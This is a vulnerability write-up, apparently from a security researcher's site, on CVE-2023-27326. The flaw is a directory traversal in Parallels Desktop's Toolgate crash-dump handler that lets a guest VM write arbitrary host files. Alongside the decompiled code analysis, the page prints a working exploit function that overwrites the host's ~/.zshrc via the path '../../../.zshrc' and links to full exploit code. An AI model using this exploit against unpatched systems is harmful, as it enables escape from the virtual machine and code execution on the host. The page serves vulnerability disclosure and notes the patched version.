<!DOCTYPE html>
<html>
<head>
    <title>CVE-2023-27326</title>
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
    <script src="/assets/js/respond.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

<meta name="theme-color" content="#353535">
<meta name="msapplication-navbutton-color" content="#353535">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

</head>
<body>
    <div class="wrapper">

        <section>
          <div id="title">
            <h1>Directory Traversal Arbitrary File Write Vulnerability</h1>
            <p>This vulnerability allows local attackers to write arbitrary files and escalate privileges on affected installations of Parallels Desktop. An attacker must first obtain the ability to execute high-privileged code on the target guest system in order to exploit this vulnerability.<br>
                <br>
                The specific flaw exists within the Toolgate component. The issue results from the lack of proper validation of a user-supplied path prior to using it in file operations. An attacker can leverage this vulnerability to write arbitrary files and execute code in the context of the current user on the host system.
                <br>
                <br>
                The vulnerable code path can be reached even if the Isolate from Mac feature is enabled.</p>                 
        
            <div><h1>Vulnerability Summary</h1></div>
            <div><p>The vulnerable code is located in one of the request handlers of the Parallel Desktop Toolgate component. This request is normally used by the guest to write a crash dump file into the <code>GuestDumps</code> subfolder of the VM's home directory. The content of this file is fully user-controlled, but its filename is formatted according to the following pattern: <code>&lt;user_input_trunc&gt;.&lt;i&gt;-&lt;j&gt;-&lt;k&gt;-&lt;l&gt;.&lt;date&gt;-&lt;time&gt;.&lt;ext&gt;.</code> </p></div>
                <div><p><h3><b>The vulnerability is twofold:</b><h3></p></div>
                <div><ul>
                    <div><li><p>First, because there is no checking being done on the <code> &lt;user_input_trunc&gt; </code> part of the filename, it is possible to perform a directory traversal, allowing to write a file that is located outside of the intended folder.</p></li></div>
                    <div><li><p>Then, because of a subtlety with Qt’s <code> QByteArray </code> and <code> QString </code> classes, the formatting of the filename can be skipped altogether (but unfortunately not the truncation of the user-input), resulting in a almost fully user-controlled path.</p></li></div>
                </ul></div>
            <div><p>Finally, this arbitrary file write can be used to overwrite the shell login script and execute arbitrary code as the user.</p></div>
            <div><h1>Vulnerability Details</h1></div>
            <div><p>The vulnerability is in the command handler of the <code> CSHAShellExt </code> tool for the request <code> TG_REQUEST_VIRTEX_CRASH </code> (ID 0x8323). All the commands of the <code> CSHAShellExt </code> tool end up in the function <code> CSHAShellExt::handle_request_inner </code> (that will be called from a different thread):</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">
uint64_t CSHAShellExt::handle_request_inner(CSHAShellExt *this, request *request) {
        // ...
        uint32_t inline_size = request->InlineByteCount;
        uint32_t *inline_data = get_request_inline_data_inner(request);
        // Ensure that there's enough inline data for the header
        if (inline_size < 0x10) { /* ... */ }
       // Ensure that the version is supported (1, 0)
        if (inline_data[0] != 1) { /* ... */ }
        // Handle the request by type
        switch (request->Request) {
            // ...
            case TG_REQUEST_VIRTEX_CRASH:
                // Ensure that this is the correct operation code (?)
                if (inline_data[2] != 4) { /* ... */ }
                // Ensure that there's at least 0x200 bytes of inline data
                if (inline_size < 0x200) { /* ... */ }
                // Call the appriopriate handler
                this->virtex_req_crash(request, inline_data, &ret);
                goto FINISH_REQUEST;
            // ...
        }
        // ...
    }
</span></code></pre></div></div>
<div><p>This function forwards the request to the appropriate handler, as the <code> CSHAShellExt </code> tool accepts different types of requests. In the case of the <code> TG_REQUEST_VIRTEX_CRASH </code> request, the corresponding handler is <code> CSHAShellExt::virtex_req_crash:</code></p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">
    void CSHAShellExt::virtex_req_crash(
        CSHAShellExt *this,
        request *request,
        uint32_t *inline_data,
        uint32_t *ret_p) {
    // ...
    // Compute the path where to store the guest dumps files
    this->m_CVirtualPC->m_CVmConfiguration->getVmIdentification()->getHomePath(&homepath);
    get_file_dir_absolute_path(&homepath_abs, &homepath);
    format_guestdumps_path(&guestdumps, &homepath_abs);
    // ...
    // Get the buffer containing the file data
    if (request->BufferCount == 0) { /* ... */ }
    buffer0_pages = map_buffer_at_idx_pages_from_guest_inner(request, 0, 0);
    if (buffer0_pages == NULL) { /* ... */ }
    // ...
    // Get the buffer containing the file name
    QString pbProcName;
    pbProcName_idx = inline_data[0x44];
    if (pbProcName_idx == 0)
        goto SKIP_PBPROCNAME;
    pbProcName_pages = map_buffer_at_idx_pages_from_guest_inner(request, pbProcName_idx, 0);
    if (pbProcName_pages == NULL) { /* ... */ }
    QByteArray pbProcName_arr;
    pbProcName_arr.resize(pbProcName_pages->RequestSize);
    read_from_buffer_pages_inner(pbProcName_pages, 0, pbProcName_arr.data(), pbProcName_pages->RequestSize);
    pbProcName = QString::fromUtf8(pbProcName_arr);
    // ...
SKIP_PBPROCNAME:
    // ...
SKIP_PBPROCPATH:
    // Handle the subrequest by type
    code = inline_data[7];
    switch (code) {
        // ...
        case 1:
            // Prepare the guest dumps directory
            prepare_guestdumps_dir(&guestdumps);
            // ...
            // Format the crash dump filename
            format_dump_filename(&filename, inline_data, &pbProcName);
            // ...
            // Build the final path from the directory and filename
            QString filepath(guestdumps);
            filepath.append(QDir::separator());
            filepath.append(filename);
            // ...
            // Finally, write the crash dump to disk
            write_dump_to_disk(buffer0_pages, &filepath);
            // ...
            break;
        // ...
    }
    // ...
}
</span></code></pre></div></div>

<div><p>This handler starts by retrieving the VM’s home path (<code><b>~/Parallels/{vmname}.pvm </b></code> by default) using <code><b> CVmIdentification::getHomePath </b></code>. It gets its absolute path using <code><b> get_file_dir_absolute_path </b></code> and appends <code><b> /GuestDumps </b></code>to it using <code><b> format_guestdumps_path </b></code> to create the final path.</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">
void get_file_dir_absolute_path(QString& abs_path, const QString& path) {
        // ...
        abs_path = QFileInfo(path).dir().absolutePath();
        // ...
    }
void format_guestdumps_path(QString& guestdumps, QString& homepath) {
        // ...
        // Append /GuestDumps to the home path
        guestdumps.append(homepath);
        guestdumps.append("/");
        guestdumps.append("GuestDumps");
        // ...
    }
</span></code></pre></div></div>
<div><p>The request buffer #0 contains the crash dump data. The request buffer #n (where n is extracted from the inline data) contains the crash dump filename. The filename is extracted and parsed as an UTF-8 string (more details on that part later).
<br><br>
    Finally, the handler extracts another subrequest type from the inline data. If it’s 1 (“write crash dump without triggering a crash”), it’ll do the following:</p></div>
     
<ul>
    <div><li><p>it calls <code><b> prepare_guestdumps_dir </b></code>that creates the guest dumps directory and removes previous crash dumps;</p></li></div>
    <div><li><p>it calls <code><b> format_dump_filename </b></code> that appends various integers, the current date/time, and an extension to the filename;</p></li></div>        
    <div><li><p>it concatenates the guest dumps directory and formatted crash dump filename (enabling the directory traversal);</p></li></div>
    <div><li><p>it calls <code><b>write_dump_to_disk</b></code> to write the crash dump data to the resulting file path.</p></li></div>
    </ul><br>
    <div><p>The code of <code><b>prepare_guestdumps_dir, format_dump_filename and write_dump_to_disk</b></code> can be found below for reference:</p></div>      
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">
    void prepare_guestdumps_dir(QString &guestdumps) {
        // ...
        // Create the directory if it doesn't exist
        QDir dir(guestdumps);
        if (!dir.exists())
            dir.mkdir(".");
        // Remove all files with the specified extensions
        QStringList extensions = { "*.dmp", "*.crash", "*.dump" };
        QFileInfoList list = dir.entryInfoList(extensions, 0x10A, 1);
        for (int i = 0; i < list.size(); ++i)
            QFile::remove(list.at(i).absoluteFilePath());
        // ...
    }
    void format_dump_filename(QString& filename, uint32_t *inline_data, QString& pbProcName) {
        // ...
        // Append some numbers from the inline data to the filename
        filename = pbProcName.mid(0, 20);
        filename.append(".");
        filename.append(QString::number(inline_data[8], 10));
        filename.append("-");
        filename.append(QString::number(inline_data[9], 10));
        filename.append("-");
        filename.append(QString::number(inline_data[0xB], 10));
        filename.append("-");
        filename.append(QString::number(inline_data[0xA], 10));
        // ...
        // Append the current date & time to the filename
        filename.append(QChar("."));
        filename.append(QDateTime::currentDateTime().date().toString());
        filename.append(QDateTime::currentDateTime().time().toString("-hhmmss"));
        // ...
        // Append the VM type to the filename
        switch (inline_data[4]) {
            case 0:
                filename.append(".non");
                break;
            // ...
        }
        // ...
        // Append the dump type to the filename
        switch (inline_data[6]) {
            case 3:
                filename.append(".dump");
                break;
            // ...
        }
        // ...
    }
    void write_dump_to_disk(pages *buffer0_pages, const QString& filepath) {
        // ...
        // Open the file for writing
        QFile file(filepath);
        if (!file.open(2)) { /* ... */ }
        // Write the content of the buffer to it
        pos = 0;
        while (1) {
            len = get_remaining_bytes_from_buffer(buffer0_pages, pos, &buf);
            if (!len)
                break;
            pos += len;
            file.write(buf, len);
            // ...
        }
        // Close the file
        file.close();
        // ...
    }
</span></code></pre></div></div>
<div><p>At first glance, it appears that the filename won’t be fully controlled, as <code><b>format_dump_filename</b></code> will truncate it and then add multiple suffixes to it. But if we provide a <code><b> pbProcName </b></code> buffer where our filename is followed by at least one null byte, the call to <code><b>QString::fromUtf8</b></code> will create a string that ends with at least one null unicode character (as <code><b>QStrings</b></code> are not null-terminated). Then, when appending other strings to it, they will go after the null unicode characters. Finally, when it will be passed to <code><b>QFile::QFile</b></code>, only the characters up to the first null one will be used. Thus, we have full control of the filename, except for the maximum length of 19 characters (because of the truncation to 20 characters, minus one for the null byte).</p></div>
<br>
<div><p>This behavior is highlighted by the following test code and its output.</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">
#include &lt;QDebug&gt;
#include &lt;QString&gt;
    int main(int argc, char *argv[]) {
    char buf[10];
            memset(buf, 0, sizeof(buf));
            strcpy(buf, "Hello");
            QString str = QString::fromUtf8(buf, sizeof(buf));
            qInfo() << str;
            str.append(" World");
            qInfo() << str;
            printf("%s\n", str.toStdString().c_str());
        }
</span></code></pre></div></div>
<div><p>Output:</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">
        "Hello\u0000\u0000\u0000\u0000\u0000"
        "Hello\u0000\u0000\u0000\u0000\u0000 World"
        Hello
</span></code></pre></div></div>
<div><p>As can be seen above, the initial <code><b> QString</b></code> contains null unicode characters, one for each of the null bytes of the buffer it was created from. The second string is then appended after the null unicode characters. Finally, when the resulting QString is converted into a regular C string, the null unicode characters are converted into null bytes, and thus the output of the printf call doesn't include the second part of the string.</p></div>
<div><p><h1>Exploitation</h1></p></div>
<div><p>This vulnerability can be used to overwrite files in the user's home directory with arbitrary content. In our exploit, we decided to target the shell configuration file <code><b> ~/.zshrc</b></code> and overwrite its contents with a simple open <code><b>/System/Applications/Calculator.app </b></code>. This will result in the Calculator app opening each time the user opens a new terminal window/tab. Another interesting target could have been the VM's configuration file <code><b>config.pvs</b></code>, located in its home path, to try to enable the Shared folders feature and gain access to the whole host file system.</p></div>
<video style="width: 100%" controls="" playsinline="" autoplay="" muted="" loop="">
<source src="POC.mp4" type="video/mp4">
</video>
<div><p>Basically, our exploit comes down to making the following request:</p></div>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
<code><span class="s2">
void exploit(void) {
        char inln[0x200];
        char *CR = kzalloc(0x1000, GFP_KERNEL);
        char *pbProcName = kzalloc(0x1000, GFP_KERNEL);
    
        memset(inln, 0, sizeof(inln));
        *(uint32_t *)(inln + 0) = 1;
        *(uint32_t *)(inln + 8) = 4;
        *(uint32_t *)(inln + 0x1c) = 1;
        *(uint32_t *)(inln + 0x110) = 1;
        strcpy(CR, "open /System/Applications/Calculator.app\n");
        strcpy(pbProcName, "../../../.zshrc");
    
        twobuf_req(0x8323, inln, 0x200, CR, strlen(CR), pbProcName, strlen(pbProcName)+1, 0);
    
        //kfree(CR);
        //kfree(pbProcName);
    }
</span></code></pre></div></div>
<div><p>The full exploit code can be found on our <a href="https://github.com/Malwareman007/CVE-2023-27326">GIT Repo</a></p></div>
<div><p><h1>Patch</h1></p></div>
<div><p>This vulnerability was assigned CVE-2023-27326 and patched in the <a href="https://kb.parallels.com/125013"> 18.1.1 (53328) security update</a> of Parallels Desktop.</p></div>
<right>
<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="hackerden" data-color="#BD5FFF" data-emoji=""  data-font="Poppins" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#ffffff" data-coffee-color="#FFDD00" ></script>
</right>
</div>
<p><a href="./../../">Home</a></p>        
</section>
        </div></body></html>